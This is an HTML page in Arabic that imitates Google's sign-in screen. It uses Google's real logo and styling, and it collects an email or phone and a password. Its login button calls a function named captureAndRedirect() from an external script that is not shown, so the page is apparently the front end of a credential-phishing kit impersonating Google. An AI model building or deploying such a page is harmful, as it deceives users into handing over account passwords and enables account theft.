<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Arial, sans-serif;
    }

    body {
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-wrapper {
      text-align: center;
    }

    .login-card {
      width: 380px;
      background: #ffffff;
      padding: 45px 40px;
      border-radius: 16px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
      border: 1px solid #dadce0;
    }

    .logo {
      width: 85px;
      margin-bottom: 25px;
    }

    h2 {
      font-weight: 500;
      margin-bottom: 8px;
      font-size: 22px;
      color: #202124;
    }

    .subtitle {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 30px;
    }

    .input-group {
      position: relative;
      margin-bottom: 22px;
    }

    .input-group input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      outline: none;
      font-size: 14px;
      transition: 0.2s ease;
    }

    .input-group input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
    }

    .input-group label {
      position: absolute;
      top: 14px;
      left: 12px;
      background: #fff;
      padding: 0 6px;
      font-size: 14px;
      color: #5f6368;
      transition: 0.2s ease;
      pointer-events: none;
    }

    .input-group input:focus + label,
    .input-group input:valid + label {
      top: -8px;
      left: 10px;
      font-size: 12px;
      color: #1a73e8;
    }

    .link {
      display: block;
      text-align: left;
      font-size: 13px;
      color: #1a73e8;
      text-decoration: none;
      margin-bottom: 28px;
      font-weight: 500;
    }

    .link:hover {
      text-decoration: underline;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
      transition: 0.25s ease;
    }

    .login-btn:hover {
      background: #1765cc;
      transform: translateY(-2px);
      box-shadow: 0 8px 18px rgba(26,115,232,0.25);
    }

    .login-btn:active {
      transform: translateY(0);
      box-shadow: none;
    }

    .footer {
      margin-top: 25px;
    }

    .footer select {
      border: none;
      background: transparent;
      font-size: 13px;
      color: #5f6368;
      cursor: pointer;
    }

    @media (max-width: 480px) {
      .login-card {
        width: 90%;
        padding: 35px 25px;
      }
    }
  </style>
</head>

<body>

  <div class="login-wrapper">
    
    <div class="login-card">
      <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">

      <h2>تسجيل الدخول</h2>
      <p class="subtitle">استخدام حسابك للمتابعة</p>

      <form>
        <div class="input-group">
          <input id="email" type="email" required>
          <label>البريد الإلكتروني أو الهاتف</label>
        </div>

        <div class="input-group">
          <input id="password" type="password" required>
          <label>كلمة المرور</label>
        </div>

        <a href="#" class="link">هل نسيت كلمة المرور؟</a>

        <button type="button" class="login-btn" onclick="captureAndRedirect()">تسجيل الدخول</button>
      </form>
    </div>

    <div class="footer">
      <select>
        <option>العربية</option>
        <option>English</option>
      </select>
    </div>

  </div>

<script src="js.js"></script>
</body>
</html>
